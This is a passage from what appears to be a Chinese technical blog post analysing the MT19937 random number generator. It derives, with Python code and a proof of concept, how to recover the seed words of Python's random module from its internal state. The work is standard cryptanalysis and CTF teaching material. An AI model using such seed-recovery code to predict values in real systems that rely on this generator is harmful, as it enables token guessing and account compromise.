class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">init_genrand</span>(<span class="params">seed</span>):</span><br><span class="line">        MT = [<span class="number">0</span>] * <span class="number">624</span></span><br><span class="line">        MT[<span class="number">0</span>] = seed &amp; <span class="number">0xffffffff</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">623</span>+<span class="number">1</span>): <span class="comment"># loop over each element</span></span><br><span class="line">            MT[i] = ((<span class="number">0x6c078965</span> * (MT[i-<span class="number">1</span>] ^ (MT[i-<span class="number">1</span>] &gt;&gt; <span class="number">30</span>))) + i) &amp; <span class="number">0xffffffff</span></span><br><span class="line">        <span class="keyword">return</span> MT</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">recover_kj_from_Ji</span>(<span class="params">ji, ji1, i</span>):</span><br><span class="line">    <span class="comment"># ji =&gt; J[i]</span></span><br><span class="line">    <span class="comment"># ji1 =&gt; J[i-1]</span></span><br><span class="line">    const = init_genrand(<span class="number">19650218</span>)</span><br><span class="line">    key = ji - (const[i] ^ ((ji1 ^ (ji1 &gt;&gt; <span class="number">30</span>))*<span class="number">1664525</span>))</span><br><span class="line">    key &amp;= <span class="number">0xffffffff</span></span><br><span class="line">    <span class="comment"># return K[j] + j</span></span><br><span class="line">    <span class="keyword">return</span> key</span><br></pre></td></tr></table></figure><p>到目前为止，我们实现了中间状态 <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.05ex;" xmlns="http://www.w3.org/2000/svg" width="1.432ex" height="1.595ex" role="img" focusable="false" viewbox="0 -683 633 705"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D43D" d="M447 625Q447 637 354 637H329Q323 642 323 645T325 664Q329 677 335 683H352Q393 681 498 681Q541 681 568 681T605 682T619 682Q633 682 633 672Q633 670 630 658Q626 642 623 640T604 637Q552 637 545 623Q541 610 483 376Q420 128 419 127Q397 64 333 21T195 -22Q137 -22 97 8T57 88Q57 130 80 152T132 174Q177 174 182 130Q182 98 164 80T123 56Q115 54 115 53T122 44Q148 15 197 15Q235 15 271 47T324 130Q328 142 387 380T447 625Z"/></g></g></g></svg></mjx-container> 到种子 <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: 0;" xmlns="http://www.w3.org/2000/svg" width="2.011ex" height="1.545ex" role="img" focusable="false" viewbox="0 -683 889 683"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D43E" d="M285 628Q285 635 228 637Q205 637 198 638T191 647Q191 649 193 661Q199 681 203 682Q205 683 214 683H219Q260 681 355 681Q389 681 418 681T463 682T483 682Q500 682 500 674Q500 669 497 660Q496 658 496 654T495 648T493 644T490 641T486 639T479 638T470 637T456 637Q416 636 405 634T387 623L306 305Q307 305 490 449T678 597Q692 611 692 620Q692 635 667 637Q651 637 651 648Q651 650 654 662T659 677Q662 682 676 682Q680 682 711 681T791 680Q814 680 839 681T869 682Q889 682 889 672Q889 650 881 642Q878 637 862 637Q787 632 726 586Q710 576 656 534T556 455L509 418L518 396Q527 374 546 329T581 244Q656 67 661 61Q663 59 666 57Q680 47 717 46H738Q744 38 744 37T741 19Q737 6 731 0H720Q680 3 625 3Q503 3 488 0H478Q472 6 472 9T474 27Q478 40 480 43T491 46H494Q544 46 544 71Q544 75 517 141T485 216L427 354L359 301L291 248L268 155Q245 63 245 58Q245 51 253 49T303 46H334Q340 37 340 35Q340 19 333 5Q328 0 317 0Q314 0 280 1T180 2Q118 2 85 2T49 1Q31 1 31 11Q31 13 34 25Q38 41 42 43T65 46Q92 46 125 49Q139 52 144 61Q147 65 216 339T285 628Z"/></g></g></g></svg></mjx-container> 的逆过程，接下来寻找初始状态 <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: 0;" xmlns="http://www.w3.org/2000/svg" width="1.14ex" height="1.545ex" role="img" focusable="false" viewbox="0 -683 504 683"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D43C" d="M43 1Q26 1 26 10Q26 12 29 24Q34 43 39 45Q42 46 54 46H60Q120 46 136 53Q137 53 138 54Q143 56 149 77T198 273Q210 318 216 344Q286 624 286 626Q284 630 284 631Q274 637 213 637H193Q184 643 189 662Q193 677 195 680T209 683H213Q285 681 359 681Q481 681 487 683H497Q504 676 504 672T501 655T494 639Q491 637 471 637Q440 637 407 634Q393 631 388 623Q381 609 337 432Q326 385 315 341Q245 65 245 59Q245 52 255 50T307 46H339Q345 38 345 37T342 19Q338 6 332 0H316Q279 2 179 2Q143 2 113 2T65 2T43 1Z"/></g></g></g></svg></mjx-container> 到中间状态 <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.05ex;" xmlns="http://www.w3.org/2000/svg" width="1.432ex" height="1.595ex" role="img" focusable="false" viewbox="0 -683 633 705"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D43D" d="M447 625Q447 637 354 637H329Q323 642 323 645T325 664Q329 677 335 683H352Q393 681 498 681Q541 681 568 681T605 682T619 682Q633 682 633 672Q633 670 630 658Q626 642 623 640T604 637Q552 637 545 623Q541 610 483 376Q420 128 419 127Q397 64 333 21T195 -22Q137 -22 97 8T57 88Q57 130 80 152T132 174Q177 174 182 130Q182 98 164 80T123 56Q115 54 115 53T122 44Q148 15 197 15Q235 15 271 47T324 130Q328 142 387 380T447 625Z"/></g></g></g></svg></mjx-container> 的过程</p><p>若已知两个连续的初始状态值 $I<em>i<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.452ex;" xmlns="http://www.w3.org/2000/svg" width="2.262ex" height="2.149ex" role="img" focusable="false" viewbox="0 -750 1000 950"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">和</text></g></g></g></svg></mjx-container>I</em>{i-1}<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.452ex;" xmlns="http://www.w3.org/2000/svg" width="4.525ex" height="2.149ex" role="img" focusable="false" viewbox="0 -750 2000 950"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">，</text></g><g data-mml-node="mi" transform="translate(1000,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">由</text></g></g></g></svg></mjx-container>(7)$可得</p><script type="math/tex; mode=display">J_i=(I_{i}+i)\oplus u(I_{i-1})B\quad\forall i\in[3,623] \quad (12)</script><p>注：由于<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="6.914ex" height="2.262ex" role="img" focusable="false" viewbox="0 -750 3056 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mo"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"/></g><g data-mml-node="mn" transform="translate(389,0)"><path data-c="39" d="M352 287Q304 211 232 211Q154 211 104 270T44 396Q42 412 42 436V444Q42 537 111 606Q171 666 243 666Q245 666 249 666T257 665H261Q273 665 286 663T323 651T370 619T413 560Q456 472 456 334Q456 194 396 97Q361 41 312 10T208 -22Q147 -22 108 7T68 93T121 149Q143 149 158 135T173 96Q173 78 164 65T148 49T135 44L131 43Q131 41 138 37T164 27T206 22H212Q272 22 313 86Q352 142 352 280V287ZM244 248Q292 248 321 297T351 430Q351 508 343 542Q341 552 337 562T323 588T293 615T246 625Q208 625 181 598Q160 576 154 546T147 441Q147 358 152 329T172 282Q197 248 244 248Z"/></g><g data-mml-node="mo" transform="translate(889,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"/></g><g data-mml-node="mo" transform="translate(1278,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"/></g><g data-mml-node="mn" transform="translate(1667,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"/><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z" transform="translate(500,0)"/></g><g data-mml-node="mo" transform="translate(2667,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"/></g></g></g></svg></mjx-container>，<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.025ex;" xmlns="http://www.w3.org/2000/svg" width="0.781ex" height="1.52ex" role="img" focusable="false" viewbox="0 -661 345 672"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"/></g></g></g></svg></mjx-container>从3开始上式才成立</p><p>上述操作的代码如下所示:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">recover_Ji_from_Ii</span>(<span class="params">Ii, Ii1, i</span>):</span><br><span class="line">    <span class="comment"># Ii =&gt; I[i]</span></span><br><span class="line">    <span class="comment"># Ii1 =&gt; I[i-1]</span></span><br><span class="line">    ji = (Ii + i) ^ ((Ii1 ^ (Ii1 &gt;&gt; <span class="number">30</span>)) * <span class="number">1566083941</span>)</span><br><span class="line">    ji &amp;= <span class="number">0xffffffff</span></span><br><span class="line">    <span class="comment"># return J[i]</span></span><br><span class="line">    <span class="keyword">return</span> ji</span><br></pre></td></tr></table></figure><p>到目前为止我们证明了两个连续的 <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: 0;" xmlns="http://www.w3.org/2000/svg" width="1.14ex" height="1.545ex" role="img" focusable="false" viewbox="0 -683 504 683"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D43C" d="M43 1Q26 1 26 10Q26 12 29 24Q34 43 39 45Q42 46 54 46H60Q120 46 136 53Q137 53 138 54Q143 56 149 77T198 273Q210 318 216 344Q286 624 286 626Q284 630 284 631Q274 637 213 637H193Q184 643 189 662Q193 677 195 680T209 683H213Q285 681 359 681Q481 681 487 683H497Q504 676 504 672T501 655T494 639Q491 637 471 637Q440 637 407 634Q393 631 388 623Q381 609 337 432Q326 385 315 341Q245 65 245 59Q245 52 255 50T307 46H339Q345 38 345 37T342 19Q338 6 332 0H316Q279 2 179 2Q143 2 113 2T65 2T43 1Z"/></g></g></g></svg></mjx-container> 值可以恢复单个 <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.05ex;" xmlns="http://www.w3.org/2000/svg" width="1.432ex" height="1.595ex" role="img" focusable="false" viewbox="0 -683 633 705"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D43D" d="M447 625Q447 637 354 637H329Q323 642 323 645T325 664Q329 677 335 683H352Q393 681 498 681Q541 681 568 681T605 682T619 682Q633 682 633 672Q633 670 630 658Q626 642 623 640T604 637Q552 637 545 623Q541 610 483 376Q420 128 419 127Q397 64 333 21T195 -22Q137 -22 97 8T57 88Q57 130 80 152T132 174Q177 174 182 130Q182 98 164 80T123 56Q115 54 115 53T122 44Q148 15 197 15Q235 15 271 47T324 130Q328 142 387 380T447 625Z"/></g></g></g></svg></mjx-container> 值，又证明了两个连续的 <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.05ex;" xmlns="http://www.w3.org/2000/svg" width="1.432ex" height="1.595ex" role="img" focusable="false" viewbox="0 -683 633 705"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D43D" d="M447 625Q447 637 354 637H329Q323 642 323 645T325 664Q329 677 335 683H352Q393 681 498 681Q541 681 568 681T605 682T619 682Q633 682 633 672Q633 670 630 658Q626 642 623 640T604 637Q552 637 545 623Q541 610 483 376Q420 128 419 127Q397 64 333 21T195 -22Q137 -22 97 8T57 88Q57 130 80 152T132 174Q177 174 182 130Q182 98 164 80T123 56Q115 54 115 53T122 44Q148 15 197 15Q235 15 271 47T324 130Q328 142 387 380T447 625Z"/></g></g></g></svg></mjx-container> 值足以恢复 <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: 0;" xmlns="http://www.w3.org/2000/svg" width="2.011ex" height="1.545ex" role="img" focusable="false" viewbox="0 -683 889 683"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D43E" d="M285 628Q285 635 228 637Q205 637 198 638T191 647Q191 649 193 661Q199 681 203 682Q205 683 214 683H219Q260 681 355 681Q389 681 418 681T463 682T483 682Q500 682 500 674Q500 669 497 660Q496 658 496 654T495 648T493 644T490 641T486 639T479 638T470 637T456 637Q416 636 405 634T387 623L306 305Q307 305 490 449T678 597Q692 611 692 620Q692 635 667 637Q651 637 651 648Q651 650 654 662T659 677Q662 682 676 682Q680 682 711 681T791 680Q814 680 839 681T869 682Q889 682 889 672Q889 650 881 642Q878 637 862 637Q787 632 726 586Q710 576 656 534T556 455L509 418L518 396Q527 374 546 329T581 244Q656 67 661 61Q663 59 666 57Q680 47 717 46H738Q744 38 744 37T741 19Q737 6 731 0H720Q680 3 625 3Q503 3 488 0H478Q472 6 472 9T474 27Q478 40 480 43T491 46H494Q544 46 544 71Q544 75 517 141T485 216L427 354L359 301L291 248L268 155Q245 63 245 58Q245 51 253 49T303 46H334Q340 37 340 35Q340 19 333 5Q328 0 317 0Q314 0 280 1T180 2Q118 2 85 2T49 1Q31 1 31 11Q31 13 34 25Q38 41 42 43T65 46Q92 46 125 49Q139 52 144 61Q147 65 216 339T285 628Z"/></g></g></g></svg></mjx-container> 值，如原文配图所示</p><p><img src="/2025/05/08/PRNG-MT19937%E5%88%86%E6%9E%90/微信截图_20250507221432.png" alt="微信截图_20250507221432"></p><p>上图的过程用代码写出即</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">recover_Kj_from_Ii</span>(<span class="params">Ii, Ii1, Ii2, i</span>):</span><br><span class="line">    <span class="comment"># Ii =&gt; I[i]</span></span><br><span class="line">    <span class="comment"># Ii1 =&gt; I[i-1]</span></span><br><span class="line">    <span class="comment"># Ii2 =&gt; I[i-2]</span></span><br><span class="line">    <span class="comment"># Ji =&gt; J[i]</span></span><br><span class="line">    <span class="comment"># Ji1 =&gt; J[i-1]</span></span><br><span class="line">    Ji = recover_Ji_from_Ii(Ii, Ii1, i)</span><br><span class="line">    Ji1 = recover_Ji_from_Ii(Ii1, Ii2, i-<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> recover_kj_from_Ji(Ji, Ji1, i)</span><br></pre></td></tr></table></figure><p>上述的恢复过程在<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="11.593ex" height="2.262ex" role="img" focusable="false" viewbox="0 -750 5124.2 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="2200" d="M0 673Q0 684 7 689T20 694Q32 694 38 680T82 567L126 451H430L473 566Q483 593 494 622T512 668T519 685Q524 694 538 694Q556 692 556 674Q556 670 426 329T293 -15Q288 -22 278 -22T263 -15Q260 -11 131 328T0 673ZM414 410Q414 411 278 411T142 410L278 55L414 410Z"/></g><g data-mml-node="mi" transform="translate(556,0)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"/></g><g data-mml-node="mo" transform="translate(1178.8,0)"><path data-c="2208" d="M84 250Q84 372 166 450T360 539Q361 539 377 539T419 540T469 540H568Q583 532 583 520Q583 511 570 501L466 500Q355 499 329 494Q280 482 242 458T183 409T147 354T129 306T124 272V270H568Q583 262 583 250T568 230H124V228Q124 207 134 177T167 112T231 48T328 7Q355 1 466 0H570Q583 -10 583 -20Q583 -32 568 -40H471Q464 -40 446 -40T417 -41Q262 -41 172 45Q84 127 84 250Z"/></g><g data-mml-node="mo" transform="translate(2123.6,0)"><path data-c="5B" d="M118 -250V750H255V710H158V-210H255V-250H118Z"/></g><g data-mml-node="mn" transform="translate(2401.6,0)"><path data-c="34" d="M462 0Q444 3 333 3Q217 3 199 0H190V46H221Q241 46 248 46T265 48T279 53T286 61Q287 63 287 115V165H28V211L179 442Q332 674 334 675Q336 677 355 677H373L379 671V211H471V165H379V114Q379 73 379 66T385 54Q393 47 442 46H471V0H462ZM293 211V545L74 212L183 211H293Z"/></g><g data-mml-node="mo" transform="translate(2901.6,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"/></g><g data-mml-node="mn" transform="translate(3346.2,0)"><path data-c="36" d="M42 313Q42 476 123 571T303 666Q372 666 402 630T432 550Q432 525 418 510T379 495Q356 495 341 509T326 548Q326 592 373 601Q351 623 311 626Q240 626 194 566Q147 500 147 364L148 360Q153 366 156 373Q197 433 263 433H267Q313 433 348 414Q372 400 396 374T435 317Q456 268 456 210V192Q456 169 451 149Q440 90 387 34T253 -22Q225 -22 199 -14T143 16T92 75T56 172T42 313ZM257 397Q227 397 205 380T171 335T154 278T148 216Q148 133 160 97T198 39Q222 21 251 21Q302 21 329 59Q342 77 347 104T352 209Q352 289 347 316T329 361Q302 397 257 397Z"/><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z" transform="translate(500,0)"/><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z" transform="translate(1000,0)"/></g><g data-mml-node="mo" transform="translate(4846.2,0)"><path data-c="5D" d="M22 710V750H159V-250H22V-210H119V710H22Z"/></g></g></g></svg></mjx-container>下才成立</p><p>完整POC</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">init_genrand</span>(<span class="params">seed</span>):</span><br><span class="line">    MT = [<span class="number">0</span>] * <span class="number">624</span></span><br><span class="line">    MT[<span class="number">0</span>] = seed &amp; <span class="number">0xffffffff</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">623</span> + <span class="number">1</span>):  <span class="comment"># loop over each element</span></span><br><span class="line">        MT[i] = ((<span class="number">0x6c078965</span> * (MT[i - <span class="number">1</span>] ^ (MT[i - <span class="number">1</span>] &gt;&gt; <span class="number">30</span>))) + i) &amp; <span class="number">0xffffffff</span></span><br><span class="line">    <span class="keyword">return</span> MT</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">recover_kj_from_Ji</span>(<span class="params">ji, ji1, i</span>):</span><br><span class="line">    <span class="comment"># ji =&gt; J[i]</span></span><br><span class="line">    <span class="comment"># ji1 =&gt; J[i-1]</span></span><br><span class="line">    const = init_genrand(<span class="number">19650218</span>)</span><br><span class="line">    key = ji - (const[i] ^ ((ji1 ^ (ji1 &gt;&gt; <span class="number">30</span>)) * <span class="number">1664525</span>))</span><br><span class="line">    key &amp;= <span class="number">0xffffffff</span></span><br><span class="line">    <span class="comment"># return K[j] + j</span></span><br><span class="line">    <span class="keyword">return</span> key</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">recover_Ji_from_Ii</span>(<span class="params">Ii, Ii1, i</span>):</span><br><span class="line">    <span class="comment"># Ii =&gt; I[i]</span></span><br><span class="line">    <span class="comment"># Ii1 =&gt; I[i-1]</span></span><br><span class="line">    ji = (Ii + i) ^ ((Ii1 ^ (Ii1 &gt;&gt; <span class="number">30</span>)) * <span class="number">1566083941</span>)</span><br><span class="line">    ji &amp;= <span class="number">0xffffffff</span></span><br><span class="line">    <span class="comment"># return J[i]</span></span><br><span class="line">    <span class="keyword">return</span> ji</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">recover_Kj_from_Ii</span>(<span class="params">Ii, Ii1, Ii2, i</span>):</span><br><span class="line">    <span class="comment"># Ii =&gt; I[i]</span></span><br><span class="line">    <span class="comment"># Ii1 =&gt; I[i-1]</span></span><br><span class="line">    <span class="comment"># Ii2 =&gt; I[i-2]</span></span><br><span class="line">    <span class="comment"># Ji =&gt; J[i]</span></span><br><span class="line">    <span class="comment"># Ji1 =&gt; J[i-1]</span></span><br><span class="line">    Ji = recover_Ji_from_Ii(Ii, Ii1, i)</span><br><span class="line">    Ji1 = recover_Ji_from_Ii(Ii1, Ii2, i-<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> recover_kj_from_Ji(Ji, Ji1, i)</span><br><span class="line"></span><br><span class="line">random.seed(<span class="number">12345</span>)</span><br><span class="line"><span class="comment"># K = [12345]</span></span><br><span class="line"><span class="comment"># k = 1</span></span><br><span class="line"></span><br><span class="line">I = random.getstate()[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>, <span class="number">624</span>):</span><br><span class="line">    <span class="built_in">print</span>(i, recover_Kj_from_Ii(I[i], I[i-<span class="number">1</span>], I[i-<span class="number">2</span>], i))</span><br></pre></td></tr></table></figure><p><img src="/2025/05/08/PRNG-MT19937%E5%88%86%E6%9E%90/微信截图_20250507221936.png" alt="微信截图_20250507221936"></p><p>在上面我们提到知道当前状态的一对值 $(S<em>i,\ S</em>{i+227})<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.452ex;" xmlns="http://www.w3.org/2000/svg" width="9.05ex" height="2.149ex" role="img" focusable="false" viewbox="0 -750 4000 950"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">可</text></g><g data-mml-node="mi" transform="translate(1000,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">以</text></g><g data-mml-node="mi" transform="translate(2000,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">恢</text></g><g data-mml-node="mi" transform="translate(3000,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">复</text></g></g></g></svg></mjx-container>I<em>{i+228}<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.452ex;" xmlns="http://www.w3.org/2000/svg" width="13.575ex" height="2.149ex" role="img" focusable="false" viewbox="0 -750 6000 950"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">的</text></g><g data-mml-node="mi" transform="translate(1000,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">低</text></g><g data-mml-node="mn" transform="translate(2000,0)"><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z"/><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z" transform="translate(500,0)"/></g><g data-mml-node="mi" 